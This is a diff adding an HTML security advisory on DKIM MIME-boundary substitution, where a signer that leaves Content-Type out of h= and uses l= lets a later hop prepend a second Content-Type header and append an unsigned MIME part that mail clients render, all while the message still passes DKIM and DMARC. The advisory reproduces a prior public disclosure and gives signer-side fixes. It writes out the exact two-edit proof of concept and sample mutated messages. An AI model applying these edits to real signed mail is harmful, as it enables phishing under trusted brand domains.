@@ -1,0 +1,158 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>A signer that omits Content-Type from h= while using l= permits MIME-boundary substitution, so a dkim=pass message renders content the signer never authored (OpenDKIM ≤ 2.11.0)</title>
+<style>
+:root { color-scheme: light dark; --fg:#111; --bg:#fff; --muted:#555; --rule:#ddd; --pre:#f5f5f5; --link:#14508c; }
+@media (prefers-color-scheme: dark) {
+  :root { --fg:#e4e4e4; --bg:#161616; --muted:#a0a0a0; --rule:#333; --pre:#1e1e1e; --link:#7fb2e5; }
+}
+body { max-width: 46rem; margin: 2.5rem auto; padding: 0 1.1rem 4rem; background: var(--bg); color: var(--fg);
+       font: 16px/1.6 -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; }
+h1 { font-size: 1.35rem; line-height: 1.35; margin: 0 0 1rem; }
+h2 { font-size: 1.05rem; margin: 2rem 0 .6rem; }
+p, li { margin: .6rem 0; }
+a { color: var(--link); }
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: .87em; }
+pre { background: var(--pre); border: 1px solid var(--rule); padding: .75rem .85rem; overflow-x: auto;
+      font-size: .82rem; line-height: 1.45; font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+table { border-collapse: collapse; width: 100%; font-size: .87rem; margin: .7rem 0; }
+th, td { border: 1px solid var(--rule); padding: .35rem .5rem; text-align: left; vertical-align: top; }
+.scroll { overflow-x: auto; }
+.hdr { font-size: .93rem; color: var(--muted); margin: 0 0 1.6rem; }
+.hdr b { color: var(--fg); font-weight: 600; }
+.lead { border-left: 3px solid var(--rule); padding-left: .85rem; margin: 0 0 1.6rem; }
+footer { margin-top: 3rem; padding-top: .8rem; border-top: 1px solid var(--rule);
+         color: var(--muted); font-size: .84rem; }
+</style>
+</head>
+<body>
+
+<h1>A signer that omits Content-Type from h= while using l= permits MIME-boundary substitution, so a dkim=pass message renders content the signer never authored (OpenDKIM ≤ 2.11.0)</h1>
+
+<p class="hdr">
+<b>Author:</b> <a href="https://weitongli.com/">Weitong Li</a>, Virginia Tech &lt;weitongli@vt.edu&gt;<br>
+<b>Date:</b> 2026-07-31<br>
+<b>Vendor:</b> <a href="http://www.trusteddomain.org/">Not applicable - the DKIM verifier is specification-correct; the fix belongs with each signer</a><br>
+<b>Software:</b> <a href="http://www.opendkim.org/">OpenDKIM (verifier under test)</a><br>
+<b>Affected version:</b> OpenDKIM 2.11.0 (Debian package <code>2.11.0~beta2-9.1+b1</code>). The verifier behaviour is not version-specific: any conforming DKIM verifier returns the same result on this input. The header-duplication mapping in the notes was made against Postfix 3.7.11.<br>
+<b>Vulnerable component:</b> DKIM signer policy — <code>h=</code> header-field selection combined with the <code>l=</code> body-length limit. The verifier path is not implicated.<br>
+<b>Vulnerability type:</b> CWE-345 (Insufficient Verification of Data Authenticity) at the composed-system level; no verifier defect<br>
+<b>Attack vector:</b> Remote. The attacker must be able to modify the message after signing, which means any hop on the delivery path, any mailing list or forwarder, or simply resending a copy of a signed message obtained from the signer.<br>
+<b>CVSS v3.1:</b> Not applicable<br>
+<b>Status:</b> Reproduced 3 of 3 through <code>fuzz/generators/mime_boundary_cases.py</code>, end to end from signer to delivered message, with the Content-Transfer-Encoding variant of the same shape confirmed 3 of 3 alongside it.
+</p>
+
+<p class="lead"><b>Impact.</b> Published for completeness and not submitted as a vendor vulnerability: the DKIM verifier is specification-correct and the weakness is a signer-side policy choice that RFC 6376 section 8.2 documents explicitly.</p>
+
+<h2>Description</h2>
+<p>A deliverable message that carries <code>dkim=pass</code>, an aligned <code>d=</code> and therefore <code>dmarc=pass</code>, while the content a recipient actually sees was authored by the attacker. Receivers and downstream consumers, including brand-indicator rendering and reputation systems, treat <code>dkim=pass</code> as evidence that the rendered message is authentic, and that inference is what breaks.</p>
+<p>The per-signer severity is high where the signer is a brand whose <code>From</code> domain is attractive to phishers. The verifier-side severity is nil, because the verifier behaved as specified.</p>
+<p>The primitive generalises. Postfix 3.7.11 rejects duplicate <code>From</code>, <code>Reply-To</code>, <code>To</code>, <code>Cc</code>, <code>Subject</code>, <code>Date</code>, <code>Message-ID</code>, <code>In-Reply-To</code> and <code>References</code> headers, but accepts duplicate <code>Content-Type</code>, <code>Content-Transfer-Encoding</code>, <code>MIME-Version</code> and the entire <code>X-</code> namespace. Every header in the accepted-by-transport and read-by-client intersection carries the same shape. A <code>Content-Transfer-Encoding</code> variant, in which the attacker prepends <code>base64</code> above a signed <code>7bit</code> and chooses body bytes that are valid base64, reproduces identically, 3 of 3.</p>
+<p><strong>This entry is published for completeness and is deliberately not submitted as a vendor vulnerability.</strong> The DKIM verifier is specification-correct: no RFC clause requires <code>Content-Type</code> to appear in <code>h=</code>, so a verifier confronted with this message is right to report <code>dkim=pass</code>. The weakness is a signer-side policy choice, and RFC 6376 section 8.2 already documents the surface it opens. There is no vendor defect to assign, and the fix belongs with each signer.</p>
+<p>A signer that omits <code>Content-Type</code> from the <code>h=</code> tag while using <code>l=</code>, historically common at large producers, lets any later hop prepend a second <code>Content-Type</code> header carrying a different <code>boundary=</code> parameter and append a MIME part that references the new boundary <em>after</em> the signed body cut. The signed bytes still hash correctly, so the verifier reports <code>dkim=pass</code>; the receiving mail client renders the attacker's MIME tree, because the topmost <code>Content-Type</code> declares the new boundary.</p>
+<p>The result is a deliverable message that is fully authenticated under DKIM and DMARC and whose visible rendering contains content the signer never produced.</p>
+<p>The laboratory signer simulates a vulnerable producer. It signs with <code>h=from:to:subject:date:message-id:mime-version</code>, which omits <code>content-type</code>, and with <code>l=145</code>, the length of the canonicalised body, using a fresh 1024-bit RSA key published at a per-run selector. <code>XXXX</code> below stands for the random suffix the laboratory generates for each run, so that no two runs share a domain or a cached DNS answer:</p>
+<pre><code>From: Alice &lt;alice@sender-XXXX.example.com&gt;
+To: Bob &lt;bob@receiver.example.com&gt;
+Subject: ct-boundary-substitution unsigned-ct
+Date: Tue, 01 Jan 2030 00:00:00 +0000
+Message-ID: &lt;ct-boundary-...@sender-XXXX.example.com&gt;
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="AAA_signed_boundary"
+
+--AAA_signed_boundary
+Content-Type: text/plain; charset=us-ascii
+
+Legitimate signed content from the real sender.
+
+--AAA_signed_boundary--</code></pre>
+<p>The post-signing mutation is two edits: one header prepended above the signed block, and one MIME part appended past the <code>l=</code> cut.</p>
+<pre><code>Content-Type: multipart/mixed; boundary="ZZZ_attacker_boundary"
+&lt;original signed message&gt;
+&lt;original CRLF.CRLF&gt;
+--ZZZ_attacker_boundary
+Content-Type: text/plain; charset=us-ascii
+
+ATTACKER-CONTROLLED CONTENT - would render in MUA but was never signed.
+--ZZZ_attacker_boundary--</code></pre>
+<p>Neither edit touches a byte the signature covers, which is precisely why the verdict is what it is:</p>
+<div class="scroll">
+<table>
+<tr><th>Element</th><th>Covered by the signature</th><th>Consulted by the mail client</th></tr>
+<tr><td>The signed <code>Content-Type</code> with <code>AAA_signed_boundary</code></td><td>no, absent from <code>h=</code></td><td>no, it is the second instance</td></tr>
+<tr><td>The prepended <code>Content-Type</code> with <code>ZZZ_attacker_boundary</code></td><td>no, added after signing</td><td><strong>yes, it is the topmost instance</strong></td></tr>
+<tr><td>The signed body prefix, 145 octets</td><td>yes</td><td>rendered as an unreferenced fragment</td></tr>
+<tr><td>The appended <code>ZZZ_attacker_boundary</code> part</td><td>no, past the <code>l=</code> cut</td><td><strong>yes, it matches the topmost boundary</strong></td></tr>
+</table>
+</div>
+<p>The delivered message carries both MIME trees and a passing signature:</p>
+<pre><code>Authentication-Results: receiver.test; spf=pass smtp.mailfrom=sender-XXXX.example.com
+Authentication-Results: receiver.test;
+    dkim=pass (1024-bit key; unprotected) header.d=sender-XXXX.example.com ...
+Content-Type: multipart/mixed; boundary="ZZZ_attacker_boundary"
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; ... l=145;
+ h=from : to : subject : date : message-id : mime-version; ...
+From: Alice &lt;alice@sender-XXXX.example.com&gt;
+...
+Content-Type: multipart/mixed; boundary="AAA_signed_boundary"
+
+--AAA_signed_boundary
+Content-Type: text/plain; charset=us-ascii
+
+Legitimate signed content from the real sender.
+
+--AAA_signed_boundary--
+
+--ZZZ_attacker_boundary
+Content-Type: text/plain; charset=us-ascii
+
+ATTACKER-CONTROLLED CONTENT - would render in MUA but was never signed.
+--ZZZ_attacker_boundary--</code></pre>
+<p>The <code>unprotected</code> annotation in the OpenDKIM result is the verifier stating, correctly, that headers outside <code>h=</code> are not covered. It is informational and does not change the <code>pass</code>.</p>
+
+<h2>Proof of Concept</h2>
+<p>Against any signer whose <code>h=</code> omits <code>content-type</code> and whose signature carries an <code>l=</code> tag, take a signed message and apply two edits:</p>
+<pre><code># 1. prepend, above every existing header
+Content-Type: multipart/mixed; boundary="ZZZ_attacker_boundary"
+
+# 2. append, after the final signed octet counted by l=
+--ZZZ_attacker_boundary
+Content-Type: text/plain; charset=us-ascii
+
+ATTACKER-CONTROLLED CONTENT
+--ZZZ_attacker_boundary--</code></pre>
+<p>Required and observed are the same thing here, which is the point of the entry: the verifier reports <code>dkim=pass</code>, and with <code>d=</code> equal to the <code>From</code> domain the message is also DMARC-aligned. The divergence is not between verifier and specification but between the signed bytes and the rendered tree.</p>
+
+<h2>Mitigation</h2>
+<p>Signer side, which is where the fix belongs. Include <code>Content-Type</code> and <code>Content-Transfer-Encoding</code> in <code>h=</code>; oversign them by naming each one more time than it occurs, so that an added instance invalidates the signature; and avoid <code>l=</code> unless a specific deployment requires it, since section 8.2 identifies it as the enabling half of this surface.</p>
+<p>Verifier side, optional and additive rather than corrective. A verifier or filter may re-canonicalise the MIME tree and emit a warning where a signature passes but the outer <code>Content-Type</code> that would be rendered differs from the signed instance, reported as a distinct <code>Authentication-Results</code> token rather than as a DKIM failure.</p>
+
+<h2>Notes</h2>
+<p><strong>Why this is not submitted as a vendor vulnerability.</strong> The verifier is correct. RFC 6376 section 3.5 leaves the choice of <code>h=</code> to the signer, section 5.4 advises the signer to choose carefully because header fields not protected by the signature can be modified in transit, and section 8.2 explicitly names <code>l=</code> together with unsigned headers as a third-party body insertion surface. A verifier that reported anything other than <code>pass</code> here would itself be non-conformant. There is accordingly no vendor defect to assign, and the mitigation is a policy change at each signer.</p>
+<p>The primitive is not new. It reproduces the case publicly disclosed by Zone.eu in May 2024 against a number of large brands. The contribution recorded here is a reproducible artefact against a current verifier and a generator that can probe any signer's <code>h=</code> policy at scale, not a novel weakness.</p>
+<p>The boundary at which this would become a submittable finding is stated for the record: if a verifier were observed to diverge from the specification-conformant behaviour on these inputs, that verifier's behaviour would be a separate and reportable finding. None was observed.</p>
+
+<h2>References</h2>
+<ul>
+<li><a href="https://www.rfc-editor.org/rfc/rfc6376#section-3.5">RFC 6376 section 3.5 - The DKIM-Signature Header Field (the signer chooses h= and l=)</a></li>
+<li><a href="https://www.rfc-editor.org/rfc/rfc6376#section-5.4">RFC 6376 section 5.4 - Determine the Header Fields to Sign</a></li>
+<li><a href="https://www.rfc-editor.org/rfc/rfc6376#section-8.2">RFC 6376 section 8.2 - Misuse of Body Length Limits (l=)</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/345.html">CWE-345: Insufficient Verification of Data Authenticity</a></li>
+<li><a href="https://github.com/trusteddomainproject/OpenDKIM">OpenDKIM repository</a></li>
+<li>Zone.eu, "BIMI and DMARC cannot save you" (May 2024) - the public disclosure this reproduces</li>
+<li><a href="https://weitongli.com/">Weitong Li, Virginia Tech - researcher homepage</a></li>
+</ul>
+
+<footer>
+<p>Reported by <a href="https://weitongli.com/">Weitong Li</a>, Virginia Tech
+(<a href="mailto:weitongli@vt.edu">weitongli@vt.edu</a>).
+Reproduction environment and full evidence available to the vendor on request.
+CVSS is the researcher's own assessment.</p>
+</footer>
+
+</body>
+</html>
